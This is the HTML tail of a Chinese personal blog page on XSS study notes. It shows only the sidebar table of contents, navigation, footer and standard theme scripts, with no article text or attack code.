+
+
+
+  <script>
+    window.subData = {
+      title: 'xss学习笔记',
+      tools: true
+    }
+  </script>
+
+
+</div>
+<aside class='l_side'>
+  
+    
+    
+      
+        
+          
+          
+            <section class='widget author'>
+  <div class='content pure'>
+    
+      <div class='avatar'>
+        <img class='avatar' src='https://cdn.jsdelivr.net/gh/lacc233/lacc233.github.io@v1.0/icon/favorite.jpg'/>
+      </div>
+    
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+          
+            <a href="https://weibo.com/u/6174928918"
+              class="social fab fa-weibo flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+          
+            <a href="https://github.com/lacc233"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+          
+            <a href="https://music.163.com/#/user/home?id=1372862909"
+              class="social fas fa-headphones-alt flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+          
+        
+      
+        
+          
+          
+            
+  <section class='widget toc-wrapper'>
+    
+<header class='pure'>
+  <div><i class="fas fa-list fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;本文目录</div>
+  
+    <div class='wrapper'><a class="s-toc rightBtn" rel="external nofollow noopener noreferrer" href="javascript:void(0)"><i class="fas fa-thumbtack fa-fw"></i></a></div>
+  
+</header>
+
+    <div class='content pure'>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分类"><span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型XSS"><span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS"><span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM型XSS"><span class="toc-text">DOM型XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盗取cookie"><span class="toc-text">盗取cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie介绍"><span class="toc-text">cookie介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反射xss盗取cookie"><span class="toc-text">反射xss盗取cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用cookie会话劫持"><span class="toc-text">利用cookie会话劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#劫持会话后的操作"><span class="toc-text">劫持会话后的操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#篡改网页链接"><span class="toc-text">篡改网页链接</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js代码讲解"><span class="toc-text">js代码讲解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss篡改链接"><span class="toc-text">xss篡改链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#篡改链接指向流量url"><span class="toc-text">篡改链接指向流量url</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#篡改链接指向恶意url"><span class="toc-text">篡改链接指向恶意url</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盗取用户信息"><span class="toc-text">盗取用户信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#盗取用户信息原理"><span class="toc-text">盗取用户信息原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setoolkit工具克隆网站"><span class="toc-text">setoolkit工具克隆网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储xss跳转克隆网站"><span class="toc-text">存储xss跳转克隆网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看盗取账号和密码"><span class="toc-text">查看盗取账号和密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#没有过滤的xss"><span class="toc-text">没有过滤的xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实验环境介绍"><span class="toc-text">实验环境介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#闭合文本标签利用xss"><span class="toc-text">闭合文本标签利用xss</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#属性中的xss"><span class="toc-text">属性中的xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#配置chrome关闭xss-auditor"><span class="toc-text">配置chrome关闭xss-auditor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#属性中xss发现"><span class="toc-text">属性中xss发现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#选择列表中的xss"><span class="toc-text">选择列表中的xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#html-select-标签介绍"><span class="toc-text">html select 标签介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#表单介绍"><span class="toc-text">表单介绍</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#选择参数中的xss"><span class="toc-text">选择参数中的xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#html表单隐藏参数介绍"><span class="toc-text">html表单隐藏参数介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#html中svg介绍"><span class="toc-text">html中svg介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#闭合触发xss"><span class="toc-text">闭合触发xss</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#限制输入长度的xss"><span class="toc-text">限制输入长度的xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#html-表单文本框介绍"><span class="toc-text">html 表单文本框介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-payload长度计算"><span class="toc-text">xss payload长度计算</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#浏览器审查工具修改源码"><span class="toc-text">浏览器审查工具修改源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-触发xss漏洞"><span class="toc-text">payload 触发xss漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#html事件中的xss"><span class="toc-text">html事件中的xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#html事件介绍"><span class="toc-text">html事件介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss漏洞发现"><span class="toc-text">xss漏洞发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#闭合思路分析"><span class="toc-text">闭合思路分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload触发xss漏洞"><span class="toc-text">payload触发xss漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#空格分隔属性的xss"><span class="toc-text">空格分隔属性的xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xss探测"><span class="toc-text">xss探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#触发xss"><span class="toc-text">触发xss</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#javascript伪协议的xss"><span class="toc-text">javascript伪协议的xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#javascript伪协议介绍"><span class="toc-text">javascript伪协议介绍</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#utf-7-xss"><span class="toc-text">utf-7 xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过过滤domain为空的xss"><span class="toc-text">绕过过滤domain为空的xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过替换script和on事件的xss"><span class="toc-text">绕过替换script和on事件的xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IE特性绕过xss过滤"><span class="toc-text">IE特性绕过xss过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#css-特性绕过xss过滤"><span class="toc-text">css 特性绕过xss过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#css触发xss"><span class="toc-text">css触发xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#css介绍"><span class="toc-text">css介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#css中执行js"><span class="toc-text">css中执行js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注释绕过关键字过滤"><span class="toc-text">注释绕过关键字过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16进制绕过过滤触发xss"><span class="toc-text">16进制绕过过滤触发xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ascii绕过过滤触发xss"><span class="toc-text">Ascii绕过过滤触发xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#源"><span class="toc-text">源</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ie的特殊处理"><span class="toc-text">ie的特殊处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#document-domain"><span class="toc-text">document.domain</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie的httponly设置"><span class="toc-text">cookie的httponly设置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie-httponly"><span class="toc-text">cookie httponly</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-filter-过滤器"><span class="toc-text">xss-filter 过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#防御函数"><span class="toc-text">防御函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编码转义"><span class="toc-text">编码转义</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#url编码"><span class="toc-text">url编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#html编码"><span class="toc-text">html编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#js编码"><span class="toc-text">js编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编码含义"><span class="toc-text">编码含义</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss过滤器绕过"><span class="toc-text">xss过滤器绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss发生的位置"><span class="toc-text">xss发生的位置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get型url中的xss"><span class="toc-text">get型url中的xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post表单中的xss"><span class="toc-text">post表单中的xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#json中的xss"><span class="toc-text">json中的xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#自定义http头中的xss"><span class="toc-text">自定义http头中的xss</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#存储型xss灰盒测试"><span class="toc-text">存储型xss灰盒测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#自动挖掘工具"><span class="toc-text">自动挖掘工具</span></a></li></ol>
+    </div>
+  </section>
+
+
+          
+        
+      
+        
+          
+          
+            <section class='widget grid'>
+  
+<header class='pure'>
+  <div><i class="fas fa-map-signs fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;站内导航</div>
+  
+</header>
+
+  <div class='content pure'>
+    <ul class="grid navgation">
+      
+        <li><a class="flat-box" title="/" href="/"
+          
+          
+          id="home">
+          
+            <i class="fas fa-clock fa-fw" aria-hidden="true"></i>
+          
+          近期文章
+        </a></li>
+      
+        <li><a class="flat-box" title="/archives/" href="/archives/"
+          
+            rel="nofollow"
+          
+          
+          id="archives">
+          
+            <i class="fas fa-archive fa-fw" aria-hidden="true"></i>
+          
+          文章归档
+        </a></li>
+      
+        <li><a class="flat-box" title="/projects/" href="/projects/"
+          
+          
+          id="projects">
+          
+            <i class="fas fa-code-branch fa-fw" aria-hidden="true"></i>
+          
+          开源项目
+        </a></li>
+      
+        <li><a class="flat-box" title="/friends/" href="/friends/"
+          
+            rel="nofollow"
+          
+          
+          id="friends">
+          
+            <i class="fas fa-link fa-fw" aria-hidden="true"></i>
+          
+          我的友链
+        </a></li>
+      
+        <li><a class="flat-box" title="https://xaoxuu.com/wiki/material-x/" href="https://xaoxuu.com/wiki/material-x/"
+          
+            rel="nofollow"
+          
+          
+          id="https:xaoxuu.comwikimaterial-x">
+          
+            <i class="fas fa-book fa-fw" aria-hidden="true"></i>
+          
+          主题文档
+        </a></li>
+      
+        <li><a class="flat-box" title="/about/" href="/about/"
+          
+            rel="nofollow"
+          
+          
+          id="about">
+          
+            <i class="fas fa-info-circle fa-fw" aria-hidden="true"></i>
+          
+          关于小站
+        </a></li>
+      
+    </ul>
+  </div>
+</section>
+
+          
+        
+      
+        
+          
+          
+            
+  <section class='widget tagcloud'>
+    
+<header class='pure'>
+  <div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;热门标签</div>
+  
+    <a class="rightBtn"
+    
+      rel="nofollow"
+    
+    
+    href="/tags/"
+    title="tags/">
+    <i class="fas fa-expand-arrows-alt fa-fw"></i></a>
+  
+</header>
+
+    <div class='content pure'>
+      <a href="/tags/DOS命令/" style="font-size: 14px; color: #999">DOS命令</a> <a href="/tags/google/" style="font-size: 14px; color: #999">google</a> <a href="/tags/kali/" style="font-size: 20.67px; color: #6c6c6c">kali</a> <a href="/tags/linux/" style="font-size: 24px; color: #555">linux</a> <a href="/tags/mysql/" style="font-size: 14px; color: #999">mysql</a> <a href="/tags/python/" style="font-size: 17.33px; color: #828282">python</a> <a href="/tags/python脚本/" style="font-size: 14px; color: #999">python脚本</a> <a href="/tags/shell命令/" style="font-size: 14px; color: #999">shell命令</a> <a href="/tags/sqlmap/" style="font-size: 14px; color: #999">sqlmap</a> <a href="/tags/sql注入/" style="font-size: 14px; color: #999">sql注入</a> <a href="/tags/ss/" style="font-size: 14px; color: #999">ss</a> <a href="/tags/vps/" style="font-size: 14px; color: #999">vps</a> <a href="/tags/web安全/" style="font-size: 14px; color: #999">web安全</a> <a href="/tags/web服务/" style="font-size: 14px; color: #999">web服务</a> <a href="/tags/windoes/" style="font-size: 14px; color: #999">windoes</a> <a href="/tags/xss/" style="font-size: 14px; color: #999">xss</a> <a href="/tags/博客搭建/" style="font-size: 14px; color: #999">博客搭建</a> <a href="/tags/工具/" style="font-size: 14px; color: #999">工具</a> <a href="/tags/无线安全/" style="font-size: 14px; color: #999">无线安全</a>
+    </div>
+  </section>
+
+
+          
+        
+      
+    
+
+  
+</aside>
+
+<footer id="footer" class="clearfix">
+  
+  
+    <div class="social-wrapper">
+      
+        
+          <a href="/atom.xml"
+            class="social fas fa-rss flat-btn"
+            target="_blank"
+            rel="external nofollow noopener noreferrer">
+          </a>
+        
+      
+        
+          <a href="https://weibo.com/u/6174928918"
+            class="social fab fa-weibo flat-btn"
+            target="_blank"
+            rel="external nofollow noopener noreferrer">
+          </a>
+        
+      
+        
+          <a href="https://github.com/lacc233"
+            class="social fab fa-github flat-btn"
+            target="_blank"
+            rel="external nofollow noopener noreferrer">
+          </a>
+        
+      
+        
+          <a href="https://music.163.com/#/user/home?id=1372862909"
+            class="social fas fa-headphones-alt flat-btn"
+            target="_blank"
+            rel="external nofollow noopener noreferrer">
+          </a>
+        
+      
+    </div>
+  
+  <br>
+  <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+  <div>
+    本站使用
+    <a href="https://xaoxuu.com/wiki/material-x/" target="_blank" class="codename">Material X</a>
+    作为主题
+    
+      ，
+      总访问量为
+      <span id="busuanzi_value_site_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span>
+      次
+    
+    。
+  </div>
+</footer>
+<script>setLoadingBarProgress(80);</script>
+
+
+      <script>setLoadingBarProgress(60);</script>
+    </div>
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+
+  <script>
+    var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+    var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+    var ALGOLIA_API_KEY = "";
+    var ALGOLIA_APP_ID = "";
+    var ALGOLIA_INDEX_NAME = "";
+    var AZURE_SERVICE_NAME = "";
+    var AZURE_INDEX_NAME = "";
+    var AZURE_QUERY_KEY = "";
+    var BAIDU_API_ID = "";
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/"||"/";
+    if(!ROOT.endsWith('/'))ROOT += '/';
+  </script>
+
+<script src="//instant.page/1.2.2" type="module" integrity="sha384-2xV8M5griQmzyiY3CDqh1dn4z3llDVqZDqzjzcY+jCBCk/a5fXJmuZ/40JJAPeoU"></script>
+
+
+  <script async src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.5/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      const $reveal = $('.reveal');
+      if ($reveal.length === 0) return;
+      const sr = ScrollReveal({ distance: 0 });
+      sr.reveal('.reveal');
+    });
+  </script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+  
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+    <script type="text/javascript">
+      $(function(){
+        if ('.cover') {
+          $('.cover').backstretch(
+          ["https://img.vim-cn.com/6d/a0c9e6f9efad8b731cb7376504bd10d79d2053.jpg"],
+          {
+            duration: "6000",
+            fade: "2500"
+          });
+        } else {
+          $.backstretch(
+          ["https://img.vim-cn.com/6d/a0c9e6f9efad8b731cb7376504bd10d79d2053.jpg"],
+          {
+            duration: "6000",
+            fade: "2500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+    
+      <script src="https://cdn.jsdelivr.net/gh/xaoxuu/volantis@1.0/js/volantis.min.js"></script>
+    
+  
+  <script>
+  var GUEST_INFO = ['nick','mail','link'];
+  var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var notify = 'true' == true;
+  var verify = 'true' == true;
+  var valine = new Valine();
+  valine.init({
+    el: '#valine_container',
+    notify: notify,
+    verify: verify,
+    guest_info: guest_info,
+    
+    appId: "s80dT3cYg98LwODISJX86IX8-MdYXbMMI",
+    appKey: "McmNeSHOdVEeoOB5v3V1OgjD",
+    placeholder: "快来评论吧~",
+    pageSize:'10',
+    avatar:'mp',
+    lang:'zh-cn',
+    highlight:'true'
+  })
+  </script>
+
+
+
+  <script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-material-x@19.5/js/app.js"></script>
+
+
+  <script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-material-x@19.5/js/search.js"></script>
+
+
+
+
+<!-- 复制 -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  let COPY_SUCCESS = "复制成功";
+  let COPY_FAILURE = "复制失败";
+  /*页面载入完成后，创建复制按钮*/
+  !function (e, t, a) {
+    /* code */
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '  <i class="fa fa-copy"></i><span>复制</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+
+      clipboard.on('success', function(e) {
+        //您可以加入成功提示
+        console.info('Action:', e.action);
+        console.info('Text:', e.text);
+        console.info('Trigger:', e.trigger);
+        success_prompt(COPY_SUCCESS);
+        e.clearSelection();
+      });
+      clipboard.on('error', function(e) {
+        //您可以加入失败提示
+        console.error('Action:', e.action);
+        console.error('Trigger:', e.trigger);
+        fail_prompt(COPY_FAILURE);
+      });
+    }
+    initCopyCode();
+
+  }(window, document);
+
+  /**
+   * 弹出式提示框，默认1.5秒自动消失
+   * @param message 提示信息
+   * @param style 提示样式，有alert-success、alert-danger、alert-warning、alert-info
+   * @param time 消失时间
+   */
+  var prompt = function (message, style, time)
+  {
+      style = (style === undefined) ? 'alert-success' : style;
+      time = (time === undefined) ? 1500 : time*1000;
+      $('<div>')
+          .appendTo('body')
+          .addClass('alert ' + style)
+          .html(message)
+          .show()
+          .delay(time)
+          .fadeOut();
+  };
+
+  // 成功提示
+  var success_prompt = function(message, time)
+  {
+      prompt(message, 'alert-success', time);
+  };
+
+  // 失败提示
+  var fail_prompt = function(message, time)
+  {
+      prompt(message, 'alert-danger', time);
+  };
+
+  // 提醒
+  var warning_prompt = function(message, time)
+  {
+      prompt(message, 'alert-warning', time);
+  };
+
+  // 信息提示
+  var info_prompt = function(message, time)
+  {
+      prompt(message, 'alert-info', time);
+  };
+
+</script>
+
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  let LAZY_LOAD_IMAGE = "";
+  $(".article-entry").find("fancybox").find("img").each(function () {
+      var element = document.createElement("a");
+      $(element).attr("data-fancybox", "gallery");
+      $(element).attr("href", $(this).attr("src"));
+      /* 图片采用懒加载处理时,
+       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
+       * 那么此处将原本的属性名src替换为对应属性名data-original,
+       * 修改如下
+       */
+       if (LAZY_LOAD_IMAGE) {
+         $(element).attr("href", $(this).attr("data-original"));
+       }
+      $(this).wrap(element);
+  });
+</script>
+
+
+
+
+
+  <script>setLoadingBarProgress(100);</script>
+</body>
+</html>
